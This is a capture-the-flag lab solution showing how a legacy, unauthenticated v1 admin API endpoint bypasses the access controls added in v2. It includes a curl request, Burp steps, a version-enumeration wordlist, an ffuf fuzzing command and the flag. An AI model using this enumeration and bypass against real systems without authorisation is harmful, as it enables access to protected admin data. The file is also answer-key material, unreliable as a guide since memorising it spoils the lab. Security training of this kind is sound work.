# SOLUTION — Lab 03 · API Version Bypass

## Vulnerability

The application exposes two versions of the same API.  
Access controls were added in `v2` but the `v1` routes were **never decommissioned**.  
The v1 admin endpoint has no authentication or authorization check.

## Payload

```
GET /api/v1/admin/config HTTP/1.1
Host: localhost:5003
```

### With curl

```bash
curl http://localhost:5003/api/v1/admin/config
```

### With Burp Repeater

1. Send `GET /api/v2/admin/config` → 403
2. Change `v2` to `v1` in the path
3. Send → 200 with the flag

## Recon approach

In a real engagement, version enumeration looks like:

```
/api/v1/...
/api/v2/...
/api/v1.1/...
/api/beta/...
/api/internal/...
/api/legacy/...
```

Automated: use **ffuf** or Burp Intruder with a wordlist of version strings.

```bash
ffuf -u http://localhost:5003/api/FUZZ/admin/config \
     -w versions.txt \
     -mc 200
```

## Trace

```
GET /api/v2/admin/config → 403  (hardened)
GET /api/v1/admin/config → 200  (legacy, unprotected)
```

## Flag

```
HackUTT{0ld_4p1_v3rs10n_n3v3r_d13s}
```
